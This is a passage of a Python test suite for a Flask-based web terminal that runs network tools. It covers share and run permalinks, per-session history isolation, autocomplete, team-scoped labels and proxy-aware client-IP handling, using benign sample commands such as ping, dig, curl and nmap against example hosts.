                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        # renderPromptEcho is now loaded by the external permalink module entry; the page
        # loads it and bridges data via window.PermData.  Confirm both are present.
        assert "permalink.entry.js" in body
        assert "prompt-echo" in body

    def test_get_share_html_content_type(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "ct-test", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert "text/html" in resp.content_type

    def test_get_share_html_includes_permalink_display_toggles(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "toggle-test",
                "content": [
                    {"text": "line 1", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'id="toggle-ln"' in body
        assert 'id="toggle-ts"' in body
        assert 'timestamps unavailable' not in body

    def test_get_share_html_shows_line_count_meta(self):
        from config import APP_VERSION
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "meta-lines-test", "content": ["a", "b", "c"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "lines" in body
        assert f"v{APP_VERSION}" in body

    def test_get_share_html_does_not_show_exit_code_badge(self):
        """Snapshots have no exit code — the badge must not appear."""
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "no-exit-test", "content": ["output line"]},
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert "meta-badge" not in body


# ── /welcome ──────────────────────────────────────────────────────────────────

class TestWelcomeRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome")
        assert resp.status_code == 200

    def test_returns_list(self):
        client = get_client()
        data = json.loads(client.get("/welcome").data)
        assert isinstance(data, list)

    def test_returns_cmd_and_out_fields_when_configured(self):
        client = get_client()
        mock_blocks = [{"cmd": "ping google.com", "out": "64 bytes"}]
        with mock.patch("blueprints.content.load_welcome", return_value=mock_blocks):
            data = json.loads(client.get("/welcome").data)
        assert len(data) == 1
        assert data[0]["cmd"] == "ping google.com"
        assert data[0]["out"] == "64 bytes"

    def test_returns_empty_list_when_no_welcome_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_welcome", return_value=[]):
            data = json.loads(client.get("/welcome").data)
        assert data == []


# ── /autocomplete ─────────────────────────────────────────────────────────────

class TestAutocompleteRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/autocomplete")
        assert resp.status_code == 200

    def test_has_suggestions_key(self):
        client = get_client()
        data = json.loads(client.get("/autocomplete").data)
        assert "suggestions" in data
        assert isinstance(data["suggestions"], list)
        assert "context" in data
        assert isinstance(data["context"], dict)
        assert "builtin_command_roots" in data
        assert "commands" in data["builtin_command_roots"]
        assert "ip" in data["builtin_command_roots"]
        assert "status" in data["builtin_command_roots"]

    def test_returns_configured_context(self):
        client = get_client()
        with mock.patch("blueprints.content.load_autocomplete_context_from_commands_registry", return_value={
            "nmap": {"flags": []},
        }):
            data = json.loads(client.get("/autocomplete").data)
        assert data["suggestions"] == []
        assert "nmap" in data["context"]

    def test_returns_wordlist_autocomplete_catalog(self):
        client = get_client()
        with mock.patch("blueprints.content.wordlist_autocomplete_items", return_value=[
            {
                "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "label": "Discovery/DNS/subdomains-top1million-5000.txt",
                "description": "DNS wordlist",
                "wordlist_category": "dns",
            },
        ]):
            data = json.loads(client.get("/autocomplete").data)

        assert data["wordlists"][0]["wordlist_category"] == "dns"
        assert data["wordlists"][0]["value"].endswith("subdomains-top1million-5000.txt")


# ── /history session isolation ────────────────────────────────────────────────

class TestHistorySessionIsolation:
    def test_empty_history_for_fresh_session(self):
        client = get_client()
        data = json.loads(client.get(
            "/history", headers={"X-Session-ID": "fresh-session-no-runs-xyz"}
        ).data)
        assert data["runs"] == []

    def test_history_scoped_to_session(self):
        session_a = "isolation-test-session-A"
        session_b = "isolation-test-session-B"
        run_id = "isolation-test-run-id-001"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) "
            "VALUES (?, ?, ?, datetime('now'))",
            (run_id, session_a, "ping isolation-test")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            runs_a = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_a}
            ).data)["runs"]
            runs_b = json.loads(client.get(
                "/history", headers={"X-Session-ID": session_b}
            ).data)["runs"]
            assert any(r["id"] == run_id for r in runs_a)
            assert not any(r["id"] == run_id for r in runs_b)
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
            conn.commit()
            conn.close()

    def test_delete_only_affects_own_session(self):
        session_a = "delete-test-session-A"
        session_b = "delete-test-session-B"
        run_a = "delete-test-run-A"
        run_b = "delete-test-run-B"
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_a, session_a, "ping a")
        )
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
            (run_b, session_b, "ping b")
        )
        conn.commit()
        conn.close()
        try:
            client = get_client()
            client.delete("/history", headers={"X-Session-ID": session_a})
            # Session B's run should be unaffected
            conn = sqlite3.connect(DB_PATH)
            count = conn.execute(
                "SELECT COUNT(*) FROM runs WHERE id=?", (run_b,)
            ).fetchone()[0]
            conn.close()
            assert count == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE id IN (?, ?)", (run_a, run_b))
            conn.commit()
            conn.close()


# ── /history/<run_id> permalink ───────────────────────────────────────────────

class TestRunPermalinkRoute:
    def _insert_run(
        self,
        run_id,
        command,
        output=None,
        *,
        preview_truncated=0,
        full_output_available=0,
        full_output_truncated=0,
        full_output_lines=None,
        artifacts=None,
        session_id="test-session",
        team_id="",
    ):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, team_id, command, started, output_preview, preview_truncated, "
            "output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, ?, ?, ?, datetime('now'), ?, ?, ?, ?, ?)",
            (
                run_id,
                session_id,
                team_id,
                command,
                json.dumps(output or []),
                preview_truncated,
                len(output or []),
                full_output_available,
                full_output_truncated,
            )
        )
        if full_output_available and full_output_lines is not None:
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, ?, ?, datetime('now'))",
                (
                    run_id,
                    f"{run_id}.txt.gz",
                    len("\n".join(full_output_lines).encode()),
                    len(full_output_lines),
                    full_output_truncated,
                ),
            )
        for artifact in artifacts or []:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))",
                (
                    artifact["id"],
                    session_id,
                    run_id,
                    artifact["workspace_path"],
                    artifact.get("display_name", ""),
                    artifact.get("kind", "unknown"),
                    artifact.get("byte_size", 0),
                    artifact.get("detected_by", "manual"),
                ),
            )
        conn.commit()
        conn.close()
        if full_output_available and full_output_lines is not None:
            import gzip
            from services.runs.output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
            ensure_run_output_dir()
            with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                for line in full_output_lines:
                    f.write(line + "\n")

    def _delete_run(self, run_id):
        from services.runs.output_store import RUN_OUTPUT_DIR
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM findings WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM entity_labels WHERE entity_id=?", (run_id,))
        conn.execute("DELETE FROM entity_notes WHERE entity_id=?", (run_id,))
        conn.execute("DELETE FROM run_file_artifacts WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM run_output_artifacts WHERE run_id=?", (run_id,))
        conn.execute("DELETE FROM runs WHERE id=?", (run_id,))
        conn.commit()
        conn.close()
        try:
            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
        except FileNotFoundError:
            pass

    def test_html_view_returns_200(self):
        run_id = "permalink-html-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert resp.status_code == 200
            assert b"<html" in resp.data.lower()
        finally:
            self._delete_run(run_id)

    def test_html_view_contains_command(self):
        run_id = "permalink-cmd-test-run"
        self._insert_run(
            run_id,
            "nmap -sV 10.0.0.1",
            artifacts=[{
                "id": "permalink-html-artifact",
                "workspace_path": "reports/nmap.txt",
                "display_name": "nmap.txt",
                "kind": "output",
                "byte_size": 64,
                "detected_by": "workspace_flag",
            }],
        )
        with db_connect() as conn:
            materialize_run_entities(
                conn,
                "test-session",
                run_id,
                [{"text": "darklab.sh", "entities": [{"type": "domain", "value": "darklab.sh"}]}],
                seen_at="2026-05-17T00:00:01+00:00",
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, 'test-session', ?, 'finding', 'open service', 'open service', 0, ?, datetime('now'))",
                ("permalink-html-atlas-finding", run_id, "fp-permalink-html-atlas"),
            )
            conn.commit()
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"nmap -sV 10.0.0.1" in resp.data
            assert b"1 artifact" in resp.data
            assert b"1 Atlas entity" in resp.data
            assert b"1 Atlas finding" in resp.data
        finally:
            self._delete_run(run_id)

    def test_json_view_returns_command(self):
        run_id = "permalink-json-test-run"
        self._insert_run(
            run_id,
            "dig google.com",
            ["answer section"],
            artifacts=[{
                "id": "permalink-json-artifact",
                "workspace_path": "reports/dig.txt",
                "display_name": "dig.txt",
                "kind": "output",
                "byte_size": 128,
                "detected_by": "workspace_flag",
            }],
        )
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO findings "
            "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
            "VALUES (?, 'test-session', ?, 'finding', 'answer found', 'answer section', 0, ?, datetime('now'))",
            ("permalink-json-finding", run_id, "fp-permalink-json"),
        )
        conn.execute(
            "INSERT INTO entity_labels "
            "(id, session_id, entity_type, entity_id, label, created) "
            "VALUES (?, 'test-session', 'run', ?, 'baseline', datetime('now'))",
            ("permalink-json-label", run_id),
        )
        conn.execute(
            "INSERT INTO entity_notes "
            "(id, session_id, entity_type, entity_id, body, created, updated) "
            "VALUES (?, 'test-session', 'run', ?, 'review note', datetime('now'), datetime('now'))",
            ("permalink-json-note", run_id),
        )
        conn.commit()
        conn.close()
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
            assert data["artifact_count"] == 1
            assert data["artifacts"][0]["workspace_path"] == "reports/dig.txt"
            assert data["finding_count"] == 1
            assert data["label_count"] == 1
            assert data["note_count"] == 1
        finally:
            self._delete_run(run_id)

    def test_json_view_is_a_bearer_permalink_across_sessions(self):
        run_id = "permalink-other-session-test-run"
        self._insert_run(run_id, "dig google.com", ["answer section"])
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "other-session"},
                ).data
            )
            assert data["command"] == "dig google.com"
            assert "answer section" in data["output"]
        finally:
            self._delete_run(run_id)

    def test_team_owned_permalink_loads_without_active_team_scope(self):
        run_id = "permalink-team-owned-test-run"
        owner_token = "tok_permalink_team_owner"
        client = get_client()
        team_id = f"team_permalink_{uuid.uuid4().hex[:12]}"
        member_id = f"tmem_permalink_{uuid.uuid4().hex[:12]}"
        created = datetime.now(timezone.utc).isoformat()
        from services.teams.storage import token_hash
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT OR IGNORE INTO session_tokens (token, created, last_seen_at) VALUES (?, ?, ?)",
                (owner_token, created, ""),
            )
            conn.execute(
                "INSERT INTO teams "
                "(id, name, slug, status, created_by_member_id, created_by_session_token_hash, created_at, updated_at) "
                "VALUES (?, ?, ?, 'active', ?, ?, ?, ?)",
                (
                    team_id,
                    "Permalink Team",
                    f"permalink-team-{uuid.uuid4().hex[:8]}",
                    member_id,
                    token_hash(owner_token),
                    created,
                    created,
                ),
            )
            conn.execute(
                "INSERT INTO team_members "
                "(id, team_id, session_token, session_token_hash, role, display_name, status, joined_at) "
                "VALUES (?, ?, ?, ?, 'owner', 'Owner', 'active', ?)",
                (member_id, team_id, owner_token, token_hash(owner_token), created),
            )
            conn.commit()
        self._insert_run(
            run_id,
            "dig team.example",
            ["team answer section"],
            session_id=owner_token,
            team_id=team_id,
        )
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO entity_labels "
            "(id, session_id, entity_type, entity_id, label, created) "
            "VALUES (?, ?, 'run', ?, 'team-private', datetime('now'))",
            ("permalink-team-label", owner_token, run_id),
        )
        conn.commit()
        conn.close()
        try:
            public_resp = client.get(f"/history/{run_id}", headers={"X-Session-ID": owner_token})
            assert public_resp.status_code == 200
            assert b"dig team.example" in public_resp.data

            public_json = json.loads(
                client.get(f"/history/{run_id}?json", headers={"X-Session-ID": owner_token}).data
            )
            assert public_json["command"] == "dig team.example"
            assert "team answer section" in public_json["output"]
            assert public_json["label_count"] == 0

            team_json = json.loads(
                client.get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                ).data
            )
            assert team_json["label_count"] == 1
            assert team_json["labels"][0]["label"] == "team-private"
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM entity_labels WHERE entity_id=?", (run_id,))
                conn.execute("DELETE FROM team_members WHERE team_id=?", (team_id,))
                conn.execute("DELETE FROM teams WHERE id=?", (team_id,))
                conn.execute("DELETE FROM session_tokens WHERE token=?", (owner_token,))
                conn.commit()
            self._delete_run(run_id)

    def test_json_view_returns_full_output_when_artifact_exists(self):
        run_id = "permalink-json-full-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "man curl"
            assert data["output"] == ["full line 1", "full line 2"]
        finally:
            self._delete_run(run_id)

    def test_json_view_falls_back_to_preview_when_full_output_artifact_is_missing(self):
        run_id = "permalink-json-full-missing-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview fallback"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        from services.runs.output_store import RUN_OUTPUT_DIR
        os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
        try:
            resp = get_client().get(
                f"/history/{run_id}?json",
                headers={"X-Session-ID": "test-session"},
            )
            data = json.loads(resp.data)
            assert resp.status_code == 200
            assert data["output"] == ["preview fallback"]
            assert data["full_output_fallback"] is True
            assert data["preview_notice"] is None
        finally:
            self._delete_run(run_id)

    def test_json_preview_view_returns_preview_when_requested(self):
        run_id = "permalink-json-preview-test-run"
        self._insert_run(
            run_id,
            "man curl",
            ["preview line"],
            preview_truncated=1,
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            data = json.loads(
                get_client().get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": "test-session"},
                ).data
            )
            assert data["command"] == "man curl"
            assert data["output"] == ["preview line"]
            assert (
                "To view the full output, use either permalink button now; "
                "after another command, use this command's history permalink"
                in data["preview_notice"]
            )
        finally:
            self._delete_run(run_id)

    def test_json_view_preserves_nuclei_template_provenance_metadata(self):
        run_id = "permalink-json-nuclei-provenance-run"
        command = "nuclei -u https://darklab.sh -t custom/nuclei/http.yaml -update-templates"
        line = "[custom-check] [http] [medium] https://darklab.sh"
        metadata = OutputSignalClassifier(command).classify_line(line)
        self._insert_run(run_id, command, [{"text": line, **metadata}])
        try:
            resp = get_client().get(f"/history/{run_id}?json", headers={"X-Session-ID": "test-session"})
            data = json.loads(resp.data)
            assert resp.status_code == 200
            source_detail = data["output_entries"][0]["source_detail"]
            assert source_detail["adapter"] == "nuclei"
            assert source_detail["template_id"] == "custom-check"
            assert source_detail["template_provenance"]["source_kind"] == "workspace_templates"
            assert source_detail["template_provenance"]["operator_updated"] is True
        finally:
            self._delete_run(run_id)

    def test_html_content_type(self):
        run_id = "permalink-ct-test-run"
        self._insert_run(run_id, "ping test")
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert "text/html" in resp.content_type
        finally:
            self._delete_run(run_id)

    def test_permalink_uses_full_output_when_available(self):
        run_id = "permalink-full-link-test-run"
        self._insert_run(
            run_id,
            "nmap -sV 10.0.0.1",
            ["preview line"],
            full_output_available=1,
            full_output_lines=["full line 1", "full line 2"],
        )
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"full line 1" in resp.data
            assert b"preview line" not in resp.data
        finally:
            self._delete_run(run_id)

    def test_preview_page_appends_truncation_notice_when_no_full_output_exists(self):
        run_id = "permalink-preview-truncated-test-run"
        self._insert_run(run_id, "nmap -sV 10.0.0.1", ["preview"], preview_truncated=1, full_output_available=0)
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            assert b"preview truncated" in resp.data
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_line_number_toggle_and_disables_timestamps_without_metadata(self):
        run_id = "permalink-toggle-test-run"
        self._insert_run(run_id, "ping google.com", ["64 bytes"])
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            body = resp.get_data(as_text=True)
            assert 'id="toggle-ln"' in body
            assert 'id="toggle-ts" disabled' in body
            assert 'timestamps unavailable for this permalink' in body
        finally:
            self._delete_run(run_id)

    def test_html_view_includes_prompt_echo_and_enabled_timestamps_for_structured_run_output(self):
        run_id = "permalink-structured-toggle-test-run"
        structured_preview = [
            {"text": "64 bytes from 8.8.8.8", "cls": "", "tsC": "12:00:00", "tsE": "+0.1s"},
        ]
        self._insert_run(run_id, "ping google.com", structured_preview)
        try:
            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
            body = resp.get_data(as_text=True)
            assert "$ ping google.com" in body
            assert 'id="toggle-ts"' in body
            assert 'timestamps unavailable for this permalink' not in body
        finally:
            self._delete_run(run_id)

    def _insert_run_with_meta(self, run_id, command, exit_code, started, finished, output=None):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, "
            "preview_truncated, output_line_count, full_output_available, full_output_truncated) "
            "VALUES (?, 'test-session', ?, ?, ?, ?, ?, 0, ?, 0, 0)",
            (
                run_id, command, started, finished, exit_code,
                json.dumps(output or []), len(output or []),
            )
        )
        conn.commit()
        conn.close()

    def test_html_view_shows_exit_code_zero_badge(self):
        run_id = "permalink-meta-exit0-run"
        self._insert_run_with_meta(
            run_id, "curl http://example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:05",
            ["HTTP/1.1 200 OK"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "exit 0" in body
            assert "meta-badge-ok" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_nonzero_exit_code_badge(self):
        run_id = "permalink-meta-exitfail-run"
        self._insert_run_with_meta(
            run_id, "curl http://missing.invalid", 6,
            "2026-04-10T10:00:00", "2026-04-10T10:00:02",
            ["curl: (6) Could not resolve host"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "exit 6" in body
            assert "meta-badge-fail" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_duration(self):
        run_id = "permalink-meta-duration-run"
        self._insert_run_with_meta(
            run_id, "nmap -sV 10.0.0.1", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:01:30",
            ["Nmap done"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert "1m 30s" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_line_count(self):
        run_id = "permalink-meta-lines-run"
        self._insert_run_with_meta(
            run_id, "dig example.com", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:01",
            ["line1", "line2", "line3"],
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            # 3 output lines + 2 injected (prompt-echo + blank) = 5, or just check "lines" present
            assert "lines" in body
        finally:
            self._delete_run(run_id)

    def test_html_view_shows_app_version(self):
        from config import APP_VERSION
        run_id = "permalink-meta-version-run"
        self._insert_run_with_meta(
            run_id, "whoami", 0,
            "2026-04-10T10:00:00", "2026-04-10T10:00:00.1",
        )
        try:
            body = get_client().get(
                f"/history/{run_id}",
                headers={"X-Session-ID": "test-session"},
            ).get_data(as_text=True)
            assert f"v{APP_VERSION}" in body
        finally:
            self._delete_run(run_id)


# ── Response content types ────────────────────────────────────────────────────

class TestContentTypes:
    def test_config_returns_json(self):
        resp = get_client().get("/config")
        assert "application/json" in resp.content_type

    def test_health_returns_json(self):
        resp = get_client().get("/health")
        assert "application/json" in resp.content_type

    def test_faq_returns_json(self):
        resp = get_client().get("/faq")
        assert "application/json" in resp.content_type

    def test_autocomplete_returns_json(self):
        resp = get_client().get("/autocomplete")
        assert "application/json" in resp.content_type

    def test_index_returns_html(self):
        resp = get_client().get("/")
        assert "text/html" in resp.content_type


# ── get_client_ip ─────────────────────────────────────────────────────────────

class TestGetClientIp:
    """get_client_ip() honors X-Forwarded-For only for trusted proxy peers,
    otherwise falls back to the direct connection IP (REMOTE_ADDR)."""

    def setup_method(self, method):  # noqa: ARG002
        self._original_level = shell_app.log.level
        shell_app.log.setLevel(logging.DEBUG)

    def teardown_method(self, method):  # noqa: ARG002
        shell_app.log.setLevel(self._original_level)

    def test_valid_ipv4_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "1.2.3.4"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "1.2.3.4"

    def test_valid_ipv6_in_xff_is_used(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "2001:db8::1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "2001:db8::1"

    def test_last_untrusted_ip_used_when_xff_has_multiple_trusted_hops(self):
        original_cidrs = list(shell_app.CFG.get("trusted_proxy_cidrs", []))
        with mock.patch.dict(
            shell_app.CFG,
            {"trusted_proxy_cidrs": original_cidrs + ["10.0.0.0/8"]},
            clear=False,
        ), mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "5.6.7.8, 10.0.0.1"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "5.6.7.8"

    def test_untrusted_proxy_logs_proxy_ip_and_falls_back(self):
        with mock.patch.object(shell_app.log, "warning") as mock_warning:
            with shell_app.app.test_request_context(
                "/health",
                environ_base={"REMOTE_ADDR": "203.0.113.10"},
                headers={"X-Forwarded-For": "1.2.3.4"},
            ):
                assert shell_app.get_client_ip() == "203.0.113.10"
        calls = [c for c in mock_warning.call_args_list if c[0][0] == "UNTRUSTED_PROXY"]
        assert calls[0].kwargs["extra"]["proxy_ip"] == "203.0.113.10"
        assert calls[0].kwargs["extra"]["forwarded_for"] == "1.2.3.4"

    def test_no_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client(use_forwarded_for=False).get("/health")
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        # Flask test client REMOTE_ADDR is 127.0.0.1
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_non_ip_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": "not-an-ip"})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"

    def test_empty_xff_falls_back_to_remote_addr(self):
        with mock.patch.object(shell_app.log, "debug") as mock_debug:
            get_client().get("/health", headers={"X-Forwarded-For": ""})
        calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
        assert calls[0].kwargs["extra"]["ip"] == "127.0.0.1"
